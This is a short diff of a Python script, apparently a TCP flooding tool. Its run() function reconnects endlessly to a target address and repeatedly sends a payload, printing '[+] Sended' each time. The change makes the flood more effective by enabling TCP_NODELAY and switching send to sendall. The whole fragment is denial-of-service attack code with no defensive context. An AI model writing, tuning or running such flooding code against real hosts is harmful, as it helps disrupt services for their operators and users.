@@ -11,12 +11,12 @@ def run():
     while True:
         try:
             s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-            # s.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
+            s.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
             s.connect((ip, port))
-            s.send(data)
+            s.sendall(data)
             print("[+] Sended ("+str(len(data))+").")
             for x in range(conn):
-                s.send(data)
+                s.sendall(data)
         except:
             s.close()
 
